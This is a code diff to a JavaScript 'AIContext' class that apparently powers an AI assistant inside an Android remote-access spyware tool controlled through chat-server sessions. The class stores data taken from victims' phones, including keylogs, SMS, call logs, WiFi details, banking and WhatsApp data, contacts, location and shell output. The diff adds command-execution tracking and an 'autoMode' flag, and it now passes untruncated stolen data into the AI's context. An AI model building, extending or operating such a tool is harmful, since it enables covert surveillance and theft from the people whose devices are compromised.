@@ -20,6 +20,8 @@ export class AIContext {
       conversationHistory: [],
       pendingProposal: null,
       grabHistory: [],
+      executedCommands: new Set(),
+      autoMode: false,
       createdAt: Date.now(),
       lastActivity: Date.now(),
     }
@@ -35,23 +37,10 @@ export class AIContext {
   updateDeviceKnowledge(session, chId, key, value) {
     if (!session.deviceKnowledge.has(chId)) {
       session.deviceKnowledge.set(chId, {
-        model: '?',
-        android: '?',
-        ip: '?',
-        owner: null,
-        contacts: [],
-        apps: [],
-        location: null,
-        lastSeen: null,
-        keylog: [],
-        sms: [],
-        callLog: [],
-        wifi: [],
-        banks: [],
-        whatsapp: [],
-        chrome: [],
-        docs: [],
-        notes: [],
+        model: '?', android: '?', ip: '?', owner: null,
+        contacts: [], apps: [], location: null, lastSeen: null,
+        keylog: [], sms: [], callLog: [], wifi: [],
+        banks: [], whatsapp: [], chrome: [], docs: [], notes: [],
       })
     }
     const device = session.deviceKnowledge.get(chId)
@@ -60,14 +49,22 @@ export class AIContext {
     session.lastActivity = Date.now()
   }
 
+  markCommandExecuted(session, command, args) {
+    session.executedCommands.add(`${command}|${args || ''}`)
+    session.lastActivity = Date.now()
+  }
+
+  wasCommandExecuted(session, command, args) {
+    return session.executedCommands.has(`${command}|${args || ''}`)
+  }
+
+  getUnexecutedCommands(session, commands) {
+    return commands.filter(c => !session.executedCommands.has(`${c.command}|${c.args || ''}`))
+  }
+
   addGrabRecord(session, chId, grabType, summary) {
     if (!session.grabHistory) session.grabHistory = []
-    session.grabHistory.push({
-      chId,
-      type: grabType,
-      summary: summary.slice(0, 200),
-      timestamp: Date.now(),
-    })
+    session.grabHistory.push({ chId, type: grabType, summary: summary.slice(0, 200), timestamp: Date.now() })
     session.lastActivity = Date.now()
   }
 
@@ -79,9 +76,7 @@ export class AIContext {
 
   addToHistory(session, role, content) {
     session.conversationHistory.push({ role, content, timestamp: Date.now() })
-    if (session.conversationHistory.length > 30) {
-      session.conversationHistory.shift()
-    }
+    if (session.conversationHistory.length > 30) session.conversationHistory.shift()
     session.lastActivity = Date.now()
   }
 
@@ -105,32 +100,36 @@ export class AIContext {
       summary.push(`  Apps: ${dev.apps.length}`)
       summary.push(`  Banks: ${dev.banks.length}`)
       summary.push(`  WhatsApp chats: ${dev.whatsapp.length}`)
-      summary.push(`  Chrome entries: ${dev.chrome.length}`)
-      summary.push(`  Documents: ${dev.docs.length}`)
       summary.push(`  SMS: ${dev.sms.length} messages`)
       summary.push(`  IP: ${dev.ip}`)
       summary.push(`  Last seen: ${dev.lastSeen ? new Date(dev.lastSeen).toISOString() : 'never'}`)
 
-      // Include raw command response data when available
-      if (dev.ip && dev.ip.length > 5 && dev.ip !== '?') summary.push(`  IP_DATA: ${dev.ip.slice(0, 300)}`)
-      if (dev.sysinfo && dev.sysinfo.length > 5) summary.push(`  SYSINFO: ${dev.sysinfo.slice(0, 600)}`)
-      if (dev.installed && dev.installed.length > 5) summary.push(`  INSTALLED_APPS: ${dev.installed.slice(0, 1500)}`)
-      if (dev.contacts && dev.contacts.length > 10 && !Array.isArray(dev.contacts)) summary.push(`  CONTACTS_DATA: ${dev.contacts.slice(0, 600)}`)
-      if (dev.sms && dev.sms.length > 10 && !Array.isArray(dev.sms)) summary.push(`  SMS_DATA: ${dev.sms.slice(0, 600)}`)
-      if (dev.call_log && dev.call_log.length > 10 && !Array.isArray(dev.call_log)) summary.push(`  CALLLOG_DATA: ${dev.call_log.slice(0, 600)}`)
-      if (dev.wifi && dev.wifi.length > 10 && !Array.isArray(dev.wifi)) summary.push(`  WIFI_DATA: ${dev.wifi.slice(0, 600)}`)
+      // Include raw command response data — full content, no truncation
+      const rawFields = ['ip', 'sysinfo', 'installed', 'contacts', 'sms', 'call_log', 'wifi', 'location', 'clipboard', 'keylog', 'notifications', 'shell', 'installed_packages']
+      for (const field of rawFields) {
+        const val = dev[field]
+        if (val && typeof val === 'string' && val.length > 3 && val !== '[]' && val !== '{}') {
+          summary.push(`  ${field.toUpperCase()}: ${val}`)
+        }
+      }
 
-      // Include any last_* command results stored by the approval handler
+      // Include any last_* command results
       for (const [key, val] of Object.entries(dev)) {
         if (key.startsWith('last_') && typeof val === 'string' && val.length > 5) {
-          summary.push(`  ${key.replace('last_', '').toUpperCase()}: ${val.slice(0, 600)}`)
+          summary.push(`  ${key.replace('last_', '').toUpperCase()}: ${val}`)
         }
+      }
+
+      // Include executed commands log
+      const executed = [...session.executedCommands].filter(e => e.includes(chId) || !e.includes('device-'))
+      if (executed.length > 0) {
+        summary.push(`  Executed commands: ${executed.map(e => e.split('|')[0]).join(', ')}`)
       }
 
       const grabs = this.getGrabHistory(session, chId)
       if (grabs.length > 0) {
         summary.push(`  Grabs: ${grabs.length} total`)
-        for (const g of grabs.slice(-3)) {
+        for (const g of grabs.slice(-5)) {
           summary.push(`    • ${g.type} at ${new Date(g.timestamp).toLocaleTimeString()}`)
         }
       }
@@ -138,13 +137,29 @@ export class AIContext {
     return summary.join('\n')
   }
 
+  clearHallucinatedData(session) {
+    for (const [, dev] of session.deviceKnowledge) {
+      if (dev.owner && !dev.last_contacts && !dev.contacts?.length) dev.owner = null
+    }
+    const hallucinatedPatterns = [
+      /(?:appears to be|identified as|named|called) \w+ \w+,? (?:a|an) \d+/i,
+      /(?:32-year-old|28-year-old|45-year-old|35-year-old)/i,
+    ]
+    session.conversationHistory = session.conversationHistory.filter(entry => {
+      if (entry.role === 'assistant') {
+        for (const pat of hallucinatedPatterns) {
+          if (pat.test(entry.content)) return false
+        }
+      }
+      return true
+    })
+  }
+
   cleanup(maxAgeMs = 3600000) {
     const now = Date.now()
     for (const [guildId, guildSessions] of this.sessions) {
       for (const [userId, session] of guildSessions) {
-        if (now - session.lastActivity > maxAgeMs) {
-          guildSessions.delete(userId)
-        }
+        if (now - session.lastActivity > maxAgeMs) guildSessions.delete(userId)
       }
       if (guildSessions.size === 0) this.sessions.delete(guildId)
     }
